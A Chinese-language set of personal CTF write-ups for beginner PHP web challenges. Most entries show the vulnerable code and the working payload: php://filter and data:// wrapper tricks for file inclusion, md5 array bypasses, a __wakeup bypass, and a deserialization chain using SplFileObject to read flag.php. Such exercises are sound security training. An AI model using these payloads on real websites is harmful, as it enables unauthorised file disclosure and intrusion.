# nss刷题
##  [SWPUCTF 2021 新生赛]jicao  
```
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```
这里介绍一下json_decode()
作用：将字符串转为数组
举例如下：
```php
<?php 
$json = '{"a":1,"b":2,"c":3,"d":4,"e":5}'; 
var_dump(json_decode($json)); 
?> 
输出
array{ 
["a"] => int(1) 
["b"] => int(2) 
["c"] => int(3) 
["d"] => int(4) 
["e"] => int(5)
```
本题payload：
?json={"x":"wllm"}
id=wllmNB
##  [SWPUCTF 2021 新生赛]easy_md5  
```
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?> 
```
md5弱比较，直接数组绕过
payload：
?name[]=1
password[]=2
##  [SWPUCTF 2021 新生赛]include  
![10530c531d7f4ef1d583841370a8fc64.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706088263070-735a5bb7-f96c-4af7-861b-67429d32df89.png#averageHue=%23f5f3f1&clientId=u41bc5da6-d0ee-4&from=paste&height=42&id=u8f47a62f&originHeight=52&originWidth=181&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1105&status=done&style=none&taskId=uaa18b20e-ecb5-41ed-9586-96bdf92de89&title=&width=144.8)
传入file=1得到题目
```
 <?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?> flag 在flag.php中
```
传入伪协议读flag
php://filter/read=convert.base64-encode/resource=flag.php
##  [SWPUCTF 2021 新生赛]easy_sql  
基础的字符型注入或者sqlmap直接嗦
##  [SWPUCTF 2021 新生赛]caidao  
蚁剑链接得到flag
##  [第五空间 2021]WebFTP  
![9438b8fea1b3b1e21bff4bea27eed3bd.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706091534304-1ca1bf21-e5f9-4f57-b58b-743460f76da5.png#averageHue=%23e2eab8&clientId=u18695db6-cf88-4&from=paste&height=295&id=uf8ae6e84&originHeight=369&originWidth=482&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23658&status=done&style=none&taskId=udda2f198-534a-4dbe-bf23-5928f09a5b8&title=&width=385.6)
尝试admin/admin和admin/password等弱密码无效，用d盾扫目录
![7fc285439975380fc7451defdb55fcb0.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706092019992-5ba71218-dab2-441e-90a7-fc04bc4bb477.png#averageHue=%230c0c0c&clientId=u18695db6-cf88-4&from=paste&height=29&id=u7b0106a2&originHeight=36&originWidth=494&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3083&status=done&style=none&taskId=u07c748f6-8ff7-449c-b983-7bf519c161b&title=&width=395.2)
扫到phpinfo直接找到flag
##  [SWPUCTF 2021 新生赛]no_wakeup  
```
<?php

header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");

class HaHaHa{


        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }

$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);

?>
```
绕过wakeup
```
 <?php
class HaHaHa{
        public $admin;
        public $passwd;
    }

$a=new HaHaHa;
$a->admin="admin";
$a->passwd="wllm";
echo(serialize($a));
```
payload：
`O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}`
##  [SWPUCTF 2021 新生赛]PseudoProtocols  
![e61e9f7fe5492b747b3e2b5db6ed8663.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706098240655-ba8ed227-2132-4f93-895e-6ba5f772707e.png#averageHue=%23f6f4f3&clientId=u18695db6-cf88-4&from=paste&height=52&id=ue96ace8a&originHeight=65&originWidth=468&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2167&status=done&style=none&taskId=ue48b5f7d-aac0-4a52-909e-fd945f02634&title=&width=374.4)
伪协议读一下hint.php地址
payload：php://filter/read=convert.base64-encode/resource=hint.php
![526713c1986a40a94b65c22b586d3a4a.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706098327217-4e6d4ded-2d7f-4fb7-b6b3-c9bea9e2562d.png#averageHue=%23fcfcfc&clientId=u18695db6-cf88-4&from=paste&height=474&id=u981a5bc8&originHeight=593&originWidth=576&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10456&status=done&style=none&taskId=u1387a58f-1a11-4112-9585-01a3dcd4572&title=&width=460.8)
进入下一层
```
 <?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?> 
```
伪协议输入
payload：?a=data://text/plain,I want flag
##  [LitCTF 2023]Ping  
输入非ip内容会弹窗，禁js即可正常使用命令得到flag
##  [GDOUCTF 2023]EZ WEB  
![c225644a9334fa04b8b41f26d031fc30.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706263779863-6186b0eb-b32d-43df-bd85-ee01a55cbed7.png#averageHue=%23e0e1aa&clientId=udf5974cd-463d-4&from=paste&height=131&id=uf2cc6656&originHeight=164&originWidth=524&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6136&status=done&style=none&taskId=u9629f830-8856-44ce-b5be-297f626632f&title=&width=419.2)
看源码有提示路径
![ffec692844e0d044254f3bb66fad34e3.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706263805883-c69d2758-c210-4472-8d93-308ab1630f77.png#averageHue=%23fcfbfa&clientId=udf5974cd-463d-4&from=paste&height=298&id=u2c37a69d&originHeight=373&originWidth=710&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27170&status=done&style=none&taskId=u85d7266a-c1f7-4c44-a5ff-9c6c74784f2&title=&width=568)
按第三条put到路径得到flag
![a476befbc1d57cece68d93cab271ca73.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706263852076-f4b03c0a-abea-4398-a700-34d4abb15446.png#averageHue=%2347a73b&clientId=udf5974cd-463d-4&from=paste&height=362&id=u51ab6236&originHeight=453&originWidth=614&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26183&status=done&style=none&taskId=uc5e8a47b-08a5-43d6-b9d8-75c1699be13&title=&width=491.2)

##  [GDOUCTF 2023]hate eat snake  
游戏结束点取消即可继续计时，等60秒后按空格即可通关获得flag
##  [GDOUCTF 2023]泄露的伪装  
扫目录看到www.rar泄露，得到
![e565e080c1a4687753ce44baa9deb722.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706266800675-1db80558-b77e-486e-93a2-b9fcd885004a.png#averageHue=%23f3f1f0&clientId=udf5974cd-463d-4&from=paste&height=120&id=u27749d68&originHeight=150&originWidth=133&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1603&status=done&style=none&taskId=u7674edda-9e61-4a66-9232-dff4cc9c0e8&title=&width=106.4)
看到
```
<?php
error_reporting(0);
if(isset($_GET['cxk'])){
    $cxk=$_GET['cxk'];
    if(file_get_contents($cxk)=="ctrl"){
        echo $flag;
    }else{
        echo "洗洗睡吧";
    }
}else{
    echo "nononoononoonono";
}
?> 
```
伪协议传参得到flag
payload：?cxk=data://text/plain,ctrl
##  [GDOUCTF 2023]受不了一点  
```
<?php
error_reporting(0);
header("Content-type:text/html;charset=utf-8");
if(isset($_POST['gdou'])&&isset($_POST['ctf'])){
    $b=$_POST['ctf'];
    $a=$_POST['gdou'];
    if($_POST['gdou']!=$_POST['ctf'] && md5($a)===md5($b)){
        if(isset($_COOKIE['cookie'])){
           if ($_COOKIE['cookie']=='j0k3r'){
               if(isset($_GET['aaa']) && isset($_GET['bbb'])){
                  $aaa=$_GET['aaa'];
                  $bbb=$_GET['bbb'];
                 if($aaa==114514 && $bbb==114514 && $aaa!=$bbb){
                   $give = 'cancanwordflag';
                   $get ='hacker!';
                   if(isset($_GET['flag']) && isset($_POST['flag'])){
                         die($give);
                    }
                   if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
                       die($get);
                    }
                    foreach ($_POST as $key => $value) {
                        $$key = $value;
                   }
                    foreach ($_GET as $key => $value) {
                         $$key = $$value;
                    }
                   echo $flag;
            }else{
                  echo "洗洗睡吧";
                 }
    }else{
        echo "行不行啊细狗";
        }
  }
}
else {
  echo '菜菜';
}
}else{
  echo "就这?";
}
}else{
  echo "别来沾边";
}
?> 
```
payload1：`ctf[]=1&gdou[]=2`
payload2：`cookie=j0k3r`
payload3：`?aaa=114514&bbb=114514a`
##  [HDCTF 2023]SearchMaster  
![16a29f6ca07c885ba139a34184e59a58.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1706267945891-8eb6ed9e-de23-4756-b2e8-8ebb9fe44e2d.png#averageHue=%232e4068&clientId=udf5974cd-463d-4&from=paste&height=252&id=u6e24b297&originHeight=315&originWidth=941&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14576&status=done&style=none&taskId=uba8e617b-71b1-42c6-a153-e2261a0a3b7&title=&width=752.8)
ssti模版注入，变量名为data
smarty模版
##  [LitCTF 2023]Flag点击就送！  
session伪造
## [HGAME 2023 week1]Classic Childhood Game
js分析找到结局函数调用得到flag
##  [GDOUCTF 2023]反方向的钟  
```
<?php
error_reporting(0);
highlight_file(__FILE__);
// flag.php
class teacher{
    public $name;
    public $rank;
    private $salary;
    public function __construct($name,$rank,$salary = 10000){
        $this->name = $name;
        $this->rank = $rank;
        $this->salary = $salary;
    }
}

class classroom{
    public $name;
    public $leader;
    public function __construct($name,$leader){
        $this->name = $name;
        $this->leader = $leader;
    }
    public function hahaha(){
        if($this->name != 'one class' or $this->leader->name != 'ing' or $this->leader->rank !='department'){
            return False;
        }
        else{
            return True;
        }
    }
}

class school{
    public $department;
    public $headmaster;
    public function __construct($department,$ceo){
        $this->department = $department;
        $this->headmaster = $ceo;
    }
    public function IPO(){
        if($this->headmaster == 'ong'){
            echo "Pretty Good ! Ctfer!\n";
            echo new $_POST['a']($_POST['b']);
        }
    }
    public function __wakeup(){
        if($this->department->hahaha()) {
            $this->IPO();
        }
    }
}

if(isset($_GET['d'])){
    unserialize(base64_decode($_GET['d']));
}
?>
```
反序列化从wakeup方法开始指向hahaha()函数，进入hahaha函数里要让name＝“one class”，让leader->name="ing",leader->rank="department",所以让leader指向teacher里，最后执行IPO，要让headmaster＝“ong”，post给a，b传参构造读伪协议 使用 splFileObject 类来读取文件内容  
```
$a=new school;
$a->department=new classroom;
$a->department->name="one class";
$a->department->leader=new teacher;
$a->department->leader->name="ing";
$a->department->leader->rank="department";
$a->headmaster="ong";
echo urlencode(base64_encode(serialize($a)));


```
post：a=SplFileObject&b=php://filter/convert.base64-encode/resource=flag.php
